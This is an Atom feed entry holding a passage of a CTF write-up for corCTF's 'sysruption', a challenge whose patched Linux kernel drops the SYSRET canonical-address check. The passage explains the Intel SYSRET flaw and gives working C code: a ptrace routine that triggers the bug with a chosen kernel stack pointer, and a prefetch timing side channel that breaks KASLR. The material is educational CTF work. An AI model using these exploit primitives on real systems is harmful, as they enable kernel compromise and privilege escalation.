<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://zolutal.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://zolutal.github.io/" rel="alternate" type="text/html" /><updated>2023-07-31T07:03:56+00:00</updated><id>https://zolutal.github.io/feed.xml</id><title type="html">zolutal’s blog</title><subtitle>systems hacking</subtitle><author><name>Justin Miller</name></author><entry><title type="html">corCTF: sysruption writeup</title><link href="https://zolutal.github.io/corctf-sysruption/" rel="alternate" type="text/html" title="corCTF: sysruption writeup" /><published>2023-07-30T00:00:00+00:00</published><updated>2023-07-30T00:00:00+00:00</updated><id>https://zolutal.github.io/corctf-sysruption</id><content type="html" xml:base="https://zolutal.github.io/corctf-sysruption/"><![CDATA[<p>I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!</p>

<p style="text-align: center;"><img src="/assets/corctf-sysruption/first-blood.png" alt="first-blood" /></p>

<p>As described by the challenge text, sysruption is about:</p>

<blockquote>
  <p>A hardware quirk, a micro-architecture attack, and a kernel exploit all in one!</p>
</blockquote>

<p>So pretty much a combination of my favorite research topics :D</p>

<p>Plus it had this sick motd!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ██████ ▓██   ██▓  ██████  ██▀███   █    ██  ██▓███  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █
▒██    ▒  ▒██  ██▒▒██    ▒ ▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █
░ ▓██▄     ▒██ ██░░ ▓██▄   ▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
  ▒   ██▒  ░ ▐██▓░  ▒   ██▒▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
▒██████▒▒  ░ ██▒▓░▒██████▒▒░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
▒ ▒▓▒ ▒ ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
░ ░▒  ░ ░ ▓██ ░▒░ ░ ░▒  ░ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░         ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░  ░  ░   ▒ ▒ ░░  ░  ░  ░    ░░   ░  ░░░ ░ ░ ░░         ░       ▒ ░░ ░ ░ ▒     ░   ░ ░
      ░   ░ ░           ░     ░        ░                        ░      ░ ░           ░
          ░ ░
</code></pre></div></div>

<p>dist:
<a href="/assets/corctf-sysruption/dist/patch.diff">patch</a>
<a href="/assets/corctf-sysruption/dist/bzImage">bzImage</a>
<a href="/assets/corctf-sysruption/dist/initramfs.cpio.gz">initramfs</a>
<a href="/assets/corctf-sysruption/dist/kconfig">kconfig</a></p>

<p>exploit:
<a href="/assets/corctf-sysruption/exploit.c">exploit.c</a>
<a href="/assets/corctf-sysruption/exploit">exploit</a></p>

<h2 id="patchwork">patchwork</h2>

<p>Looking at what was provided for the challenge, there are some kernel files and a run script along with a patchfile.</p>

<p>Here are the contents of the patch:</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">--- orig_entry_64.S
</span><span class="gi">+++ linux-6.3.4/arch/x86/entry/entry_64.S
</span><span class="p">@@ -150,13 +150,13 @@</span>
 	ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", \
 		"shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
 #else
<span class="gd">-	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
-	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
</span><span class="gi">+	# shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+	# sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
</span> #endif
<span class="err">
</span> 	/* If this changed %rcx, it was not canonical */
<span class="gd">-	cmpq	%rcx, %r11
-	jne	swapgs_restore_regs_and_return_to_usermode
</span><span class="gi">+	# cmpq	%rcx, %r11
+	# jne	swapgs_restore_regs_and_return_to_usermode
</span><span class="err">
</span> 	cmpq	$__USER_CS, CS(%rsp)		/* CS must match SYSRET */
 	jne	swapgs_restore_regs_and_return_to_usermode
<span class="err">
</span></code></pre></div></div>

<p>So what is going on here?</p>

<p>The first set of lines which are commented out are doing arithmetic shifts on rcx, the register holding the userspace rip.</p>

<p>The following lines then check if those shifts modified rcx, and if it did it will jump to the a different exit path <code class="language-plaintext highlighter-rouge">swapgs_restore_regs_and_return_to_usermode</code> instead of continuing in <code class="language-plaintext highlighter-rouge">entry_SYSCALL_64</code>.</p>

<p>Without needing to look into what the shifts are doing, it is pretty clear from the comment that this change is just removing the address canonicality checks on the userspace rip.</p>

<p>A look at the context of this patch reveals an <a href="https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/entry/entry_64.S#L139">even more helpful comment</a> in the source:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*
 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
 * in kernel space.  This essentially lets the user take over
 * the kernel, since userspace controls RSP.
 *
 * If width of "canonical tail" ever becomes variable, this will need
 * to be updated to remain correct on both old and new CPUs.
 *
 * Change top bits to match most significant bit (47th or 56th bit
 * depending on paging mode) in the address.
 */
</code></pre></div></div>

<p>So removing the canonicality checks, as this patch does, theoretically should reintroduce the Intel SYSRET bug and let us “take over the kernel”, sounds fun.</p>

<h2 id="sysret-background">sysret background</h2>

<p>I was already familiar with this bug as I had actually looked into a while back after my professor for advanced operating systems mentioned it, so I had a pretty immediate understanding of what was going on here. But I’d like to give some background based on my understanding of the bug for those who arent familiar.</p>

<p>Essentially, the sysret bug is about a difference between how AMD and Intel implement the sysret instruction. Though I should note that while I think most people would consider this a bug in Intel’s implementation of sysret, Intel does not since it behaves according to their specifications, which… I guess?</p>

<p>Here are snippets of pseudocode for sysret from the Intel and AMD manuals:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">------------------</span> <span class="n">INTEL</span> <span class="o">-------------------|-------------------</span>  <span class="n">AMD</span> <span class="o">----------------------</span>
<span class="p">...</span>                                         <span class="o">|</span> <span class="p">...</span>
<span class="n">IF</span> <span class="p">(</span><span class="n">operand</span> <span class="n">size</span> <span class="n">is</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span><span class="p">)</span>                 <span class="o">|</span> <span class="n">SYSRET_64BIT_MODE</span><span class="o">:</span>
    <span class="n">THEN</span> <span class="p">(</span><span class="o">*</span> <span class="n">Return</span> <span class="n">to</span> <span class="mi">64</span><span class="o">-</span><span class="n">Bit</span> <span class="n">Mode</span> <span class="o">*</span><span class="p">)</span>        <span class="o">|</span> <span class="n">IF</span> <span class="p">(</span><span class="n">OPERAND_SIZE</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">IF</span> <span class="p">(</span><span class="n">RCX</span> <span class="n">is</span> <span class="n">not</span> <span class="n">canonical</span><span class="p">)</span> <span class="n">THEN</span> <span class="err">#</span><span class="n">GP</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="o">|</span> <span class="p">{</span>
        <span class="n">RIP</span> <span class="o">:=</span> <span class="n">RCX</span><span class="p">;</span>                         <span class="o">|</span>      <span class="n">CS</span><span class="p">.</span><span class="n">sel</span> <span class="o">=</span> <span class="p">(</span><span class="n">MSR_STAR</span><span class="p">.</span><span class="n">SYSRET_CS</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="n">OR</span> <span class="mi">3</span>
    <span class="n">ELSE</span> <span class="p">(</span><span class="o">*</span> <span class="n">Return</span> <span class="n">to</span> <span class="n">Compatibility</span> <span class="n">Mode</span> <span class="o">*</span><span class="p">)</span> <span class="o">|</span>      <span class="p">...</span>
        <span class="n">RIP</span> <span class="o">:=</span> <span class="n">ECX</span><span class="p">;</span>                         <span class="o">|</span> <span class="p">}</span>
<span class="n">FI</span><span class="p">;</span>                                         <span class="o">|</span> <span class="p">...</span>
<span class="p">...</span>                                         <span class="o">|</span> <span class="n">RIP</span> <span class="o">=</span> <span class="n">temp_RIP</span>
<span class="n">CS</span><span class="p">.</span><span class="n">Selector</span> <span class="o">:=</span> <span class="n">CS</span><span class="p">.</span><span class="n">Selector</span> <span class="n">OR</span> <span class="mi">3</span><span class="p">;</span>            <span class="o">|</span> <span class="n">EXIT</span>
            <span class="p">(</span><span class="o">*</span> <span class="n">RPL</span> <span class="n">forced</span> <span class="n">to</span> <span class="mi">3</span> <span class="o">*</span><span class="p">)</span>           <span class="o">|</span>
<span class="p">...</span>                                         <span class="o">|</span>
</code></pre></div></div>

<p>The important part here is that the canonicality check on Intel occurs BEFORE the CS selector is set, whereas on AMD there is no builtin canonicality check in the instruction but it will be checked after the CS selector is set when the cpu attempts to fetch the next instruction. The CS selector determines the current privilege level (CPL), CPL 0 is kernel mode and CPL 3 is user mode.</p>

<p>So on Intel CPUs when sysret is executed with a non-canonical instruction pointer a General Protection (GP) fault will be raised in kernel mode!</p>

<p>But on AMD CPUs when sysret is executed with a non-canonical instruction pointer a GP will occur on instruction fetch in user mode.</p>

<p>But why does this distinction matter? well, the issue is in how faults from different privilege levels are handled. On x86 when a fault occurs in CPL 3 the stack pointer will be set to a value defined in the TSS (RPS0):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Although hardware task-switching is not supported in 64-bit mode, a 64-bit task state segment (TSS) must exist.
Figure 8-11 shows the format of a 64-bit TSS. The TSS holds information important to 64-bit mode and that is not
directly related to the task-switch mechanism. This information includes:
• RSPn — The full 64-bit canonical forms of the stack pointers (RSP) for privilege levels 0-2.
• ISTn — The full 64-bit canonical forms of the interrupt stack table (IST) pointers.
• I/O map base address — The 16-bit offset to the I/O permission bit map from the 64-bit TSS base.
</code></pre></div></div>

<p class="caption">Intel SDM Volume 3 Ch. 8 Section 7: Task Management in 64-Bit Mode</p>

<p>But these stacks are only used when changing from a lower CPL to a higher CPL, if a fault occurs in a CPL greater than or equal to the the desired privilege level (DPL) for that fault (specified in the the IDT entry), the current stack is used.</p>

<p>This becomes a problem on Intel CPUs because the the GP occurs at CPL 0 and the IDT descriptor for GP has DPL 0 so no privilege level change occurs, meaning instead of moving to the RSP0 stack pointer from the TSS, as would happen with a fault from user space, the fault will behave as a fault from kernel space and use the current (user controlled) stack pointer. So with a non-canonical instruction pointer the stack location when entering the GP fault handler will be a user controlled address.</p>

<p>Phew, x86 sure is something.</p>

<h2 id="triggering-the-bug">triggering the bug</h2>

<p>But how do you even reach sysret with a non-canonical instruction pointer? After all you need to have execute system call to be in <code class="language-plaintext highlighter-rouge">entry_SYSCALL_64</code> in the first place, so you can’t just jump to a non-canonical address or something since that won’t ever hit sysret.</p>

<p>I had a few ideas of how to go about this, one I had heard about <a href="https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/">here</a> was to map the last page before the non-canonical address gap and execute a syscall instruction at the end of that page which would cause rip to be incremented to a non-canonical address when executed, but it seems Linux does not let you map that page. Another idea I had was to use sigreturn to set the user space rip to a non-canonical address which probably would have worked, but I ended up finding a <a href="https://github.com/vnik5287/cve-2014-4699-ptrace/blob/master/poc_v0.c">poc</a> to trigger the bug using ptrace related to this <a href="https://duasynt.com/blog/cve-2014-4699-linux-kernel-ptrace-sysret-analysis">blog</a> on a Linux CVE the author found involving sysret.</p>

<p>This poc worked to trigger the bug almost immediately after some fixing up, but the exploitation was far from done.</p>

<p>Cleaned up poc:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">do_sysret</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="o">*</span><span class="n">regs_arg</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">chld</span><span class="p">;</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">regs</span><span class="p">,</span> <span class="n">regs_arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">regs</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">chld</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"fork"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">chld</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"PTRACE_TRACEME"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">raise</span><span class="p">(</span><span class="n">SIGSTOP</span><span class="p">);</span>
        <span class="n">fork</span><span class="p">();</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">waitpid</span><span class="p">(</span><span class="n">chld</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETOPTIONS</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PTRACE_O_TRACEFORK</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">waitpid</span><span class="p">(</span><span class="n">chld</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x8000000000000000</span><span class="p">;</span> <span class="c1">// not-canonical</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rcx</span> <span class="o">=</span> <span class="mh">0x8000000000000000</span><span class="p">;</span> <span class="c1">// not-canonical</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>

    <span class="c1">// necessary stuff</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">eflags</span> <span class="o">=</span> <span class="mh">0x246</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">r11</span> <span class="o">=</span> <span class="mh">0x246</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">ss</span> <span class="o">=</span> <span class="mh">0x2b</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">cs</span> <span class="o">=</span> <span class="mh">0x33</span><span class="p">;</span>

    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">chld</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The whole point of triggering this bug is to cause memory corruption through the register dump that occurs in the GP handler, so I tried setting my stack pointer to some writeable kernel data structures to see if I could hijack them. Stepping through the GP handler I could see that it did exactly that! until it all came crashing down…</p>

<h2 id="surviving-the-bug">surviving the bug</h2>

<p>Triggering the bug with a target kernel address in rsp was failing because of a double fault caused by the GP handler unexpectedly executing with user space’s gsbase.</p>

<p>The gsbase register is used on Linux to access percpu variables. In the Linux source code it is equivalent to the <code class="language-plaintext highlighter-rouge">current</code> macro. On kernel entry and exit the <code class="language-plaintext highlighter-rouge">swapgs</code> instruction is executed to switch back and forth between the kernel and user gsbase values since user space is allowed to use a gs segment as well.</p>

<p>e.g. in <code class="language-plaintext highlighter-rouge">entry_SYSCALL_64</code>:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">entry_SYSCALL_64:</span>
    <span class="nf">swapgs</span>
    <span class="nf">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">0x6014</span><span class="p">,</span><span class="nb">rsp</span>
<span class="nf">...</span>
    <span class="nf">swapgs</span>
    <span class="nf">sysretq</span>
</code></pre></div></div>

<p>But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero so that results in a pagefault.</p>

<p>Lets take a deeper look at what is going on in the GP handler.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">asm_exc_general_protection:</span>
    <span class="nf">cld</span>
    <span class="nf">call</span>   <span class="nv">error_entry</span>
    <span class="nf">mov</span>    <span class="nb">rsp</span><span class="p">,</span><span class="nb">rax</span>
    <span class="nf">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rsp</span>
    <span class="nf">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x78</span><span class="p">]</span>
    <span class="nf">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x78</span><span class="p">],</span><span class="mh">0xffffffffffffffff</span>
    <span class="nf">call</span>   <span class="nv">exc_general_protection</span>
    <span class="nf">jmp</span>    <span class="nv">error_return</span>
</code></pre></div></div>

<p>When a GP occurs, execution is redirected to the handler above, which immediately calls into <code class="language-plaintext highlighter-rouge">error_entry</code>. The <code class="language-plaintext highlighter-rouge">error_entry</code> function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of <code class="language-plaintext highlighter-rouge">error_entry</code> is:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">error_entry:</span>
    <span class="nf">push</span>   <span class="nb">rsi</span>
    <span class="nf">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
    <span class="nf">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">rdi</span>
    <span class="nf">push</span>   <span class="nb">rdx</span>
    <span class="nf">push</span>   <span class="nb">rcx</span>
    <span class="nf">push</span>   <span class="nb">rax</span>
    <span class="nf">push</span>   <span class="nv">r8</span>
    <span class="nf">push</span>   <span class="nv">r9</span>
    <span class="nf">push</span>   <span class="nv">r10</span>
    <span class="nf">push</span>   <span class="nv">r11</span>
    <span class="nf">push</span>   <span class="nb">rbx</span>
    <span class="nf">push</span>   <span class="nb">rbp</span>
    <span class="nf">push</span>   <span class="nv">r12</span>
    <span class="nf">push</span>   <span class="nv">r13</span>
    <span class="nf">push</span>   <span class="nv">r14</span>
    <span class="nf">push</span>   <span class="nv">r15</span>
    <span class="nf">push</span>   <span class="nb">rsi</span>
<span class="nf">...</span>
</code></pre></div></div>
<p>The start of error entry is what handles storing the registers for interrupts, this is the memory corruption we are trying to exploit, all general purpose registers will be pushed to the stack pointer we control.</p>

<p>Here is where in error entry <code class="language-plaintext highlighter-rouge">swapgs</code> is skipped if we entered from kernel space.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">error_entry:</span>
<span class="nf">...</span>
    <span class="nf">test</span>   <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x90</span><span class="p">],</span><span class="mh">0x3</span> <span class="o">&lt;--</span> <span class="nv">CPL</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="nv">?</span>
    <span class="nf">jz</span>     <span class="mh">0xffffffff81c014b2</span>      <span class="o">&lt;--</span> <span class="nv">skip</span> <span class="nv">swapgs</span> <span class="nv">if</span> <span class="mi">0</span>
    <span class="nf">swapgs</span>
<span class="nf">...</span>
</code></pre></div></div>

<p>And this is where the gs segment is first used, causing the system to double fault.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">exc_general_protection:</span>
    <span class="nf">push</span>   <span class="nv">r13</span>
    <span class="nf">mov</span>    <span class="nv">r13</span><span class="p">,</span><span class="nb">rsi</span>
    <span class="nf">push</span>   <span class="nv">r12</span>
    <span class="nf">push</span>   <span class="nb">rbp</span>
    <span class="nf">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rdi</span>
    <span class="nf">push</span>   <span class="nb">rbx</span>
    <span class="nf">sub</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x70</span>
    <span class="nf">mov</span>    <span class="nb">rax</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">0x28</span> <span class="o">&lt;--</span> <span class="nv">fault</span> <span class="nv">here</span> <span class="p">:(</span>
</code></pre></div></div>

<p>So how can we survive this?</p>

<p>In the ptrace sysret blog, the author survives the double fault by targeting the Interrupt Descriptor Table (IDT) in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don’t have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.</p>

<p>Well the gsbase belongs to userspace, but can we control our own gsbase? can we make it point to a kernel address?</p>

<p>My first attempt was to have ptrace set gsbase since I was already using ptrace to set the registers, but as it turns out <a href="https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/kernel/ptrace.c#L395">ptrace will not set gsbase if the address is greater than TASK_SIZE_MAX</a> (greater than the max user space address).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">case</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_regs_struct</span><span class="p">,</span><span class="n">gs_base</span><span class="p">):</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">value</span> <span class="o">&gt;=</span> <span class="n">TASK_SIZE_MAX</span><span class="p">)</span> <span class="o">&lt;--</span> <span class="n">sad</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">EIO</span><span class="p">;</span>
        <span class="n">x86_gsbase_write_task</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<p>The same is true of <code class="language-plaintext highlighter-rouge">arch_prctl(ARCH_SET_GS)</code> as well…</p>

<p>Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gsbase be set from user space via the wrgsbase instruction!</p>

<p><code class="language-plaintext highlighter-rouge">asm volatile("wrgsbase %0" : : "r" (gsbase));</code></p>

<p>So if I just use this instruction to modify user space gsbase in the process triggering the sysret bug and I should survive the fault!</p>

<p>Except… not quite. I first tried setting it to a random read/write kernel address and that got me a little further, but the percpu data contains pointers that the kernel will try to dereference which just becomes double faulting again.</p>

<p>So setting it to some random address wasn’t going to cut it, I figured the most stable option would be to just user space gsbase to kernel gsbase so that when the vulnerability triggered the kernel would be running with the gsbase it expected.</p>

<p>One small problem, kernel gsbase is in physmap… how am I supposed to know where that is? and while I’m at it how am I supposed to know where the kernel itself is? I had been debugging with KASLR disabled, but for remote I’ll need leaks somehow…</p>

<h2 id="breaking-kaslr">Breaking KASLR</h2>

<p>So given that triggering the vulnerability will crash the system if the address pointed to by stack pointer is unmapped or gsbase is wrong, how can KASLR be broken independent of this vulnerability? the answer lies in the micro-architecture.</p>

<p>KASLR has been publicly broken for all Intel cpus since 2016. The techinque was discovered by Gruss et al. in 2016 and is referred to as a <a href="https://gruss.cc/files/prefetch.pdf">Prefetch Attack</a> as it relies on the timing variance of the x86 <code class="language-plaintext highlighter-rouge">prefetch</code> instructions when executed against cached kernel address translations.</p>

<p>For a simple implementation of a prefetch attack I reached for the <a href="https://www.willsroot.io/2022/12/entrybleed.html">entrybleed poc</a>, which is just a specific use of a prefetch attack for breaking KASLR when KPTI is enabled but the same code works with KPTI disabled as well. This was enough to break KASLR of the kernel image, but I still needed to break physmap KASLR to be able to survive the use of percpu variables…</p>

<p>But that was simple enough, all I had to do was define some ranges and step sizes that work for physmap and add a flag to choose which randomization I want to break.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// largely based on: https://www.willsroot.io/2022/12/entrybleed.html</span>

<span class="cp">#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
</span>
<span class="cp">#define STEP_KERNEL 0x100000ull
#define SCAN_START_KERNEL KERNEL_LOWER_BOUND
#define SCAN_END_KERNEL KERNEL_UPPER_BOUND
#define ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL
</span>
<span class="cp">#define PHYS_LOWER_BOUND 0xffff888000000000ull
#define PHYS_UPPER_BOUND 0xfffffe0000000000ull
</span>
<span class="cp">#define STEP_PHYS 0x40000000ull
#define SCAN_START_PHYS PHYS_LOWER_BOUND
#define SCAN_END_PHYS PHYS_UPPER_BOUND
#define ARR_SIZE_PHYS (SCAN_END_PHYS - SCAN_START_PHYS) / STEP_PHYS
</span>
<span class="cp">#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
</span>
<span class="c1">// https://www.willsroot.io/2022/12/entrybleed.html</span>
<span class="kt">uint64_t</span> <span class="nf">sidechannel</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">uint64_t</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">;</span>
  <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">".intel_syntax noprefix;"</span>
    <span class="s">"mfence;"</span>
    <span class="s">"rdtscp;"</span>
    <span class="s">"mov %0, rax;"</span>
    <span class="s">"mov %1, rdx;"</span>
    <span class="s">"xor rax, rax;"</span>
    <span class="s">"lfence;"</span>
    <span class="s">"prefetchnta qword ptr [%4];"</span>
    <span class="s">"prefetcht2 qword ptr [%4];"</span>
    <span class="s">"xor rax, rax;"</span>
    <span class="s">"lfence;"</span>
    <span class="s">"rdtscp;"</span>
    <span class="s">"mov %2, rax;"</span>
    <span class="s">"mov %3, rdx;"</span>
    <span class="s">"mfence;"</span>
    <span class="s">".att_syntax;"</span>
    <span class="o">:</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">d</span><span class="p">)</span>
    <span class="o">:</span> <span class="s">"r"</span> <span class="p">(</span><span class="n">addr</span><span class="p">)</span>
    <span class="o">:</span> <span class="s">"rax"</span><span class="p">,</span> <span class="s">"rbx"</span><span class="p">,</span> <span class="s">"rcx"</span><span class="p">,</span> <span class="s">"rdx"</span><span class="p">);</span>
  <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">a</span><span class="p">;</span>
  <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">c</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="n">a</span><span class="p">;</span>
<span class="p">}</span>

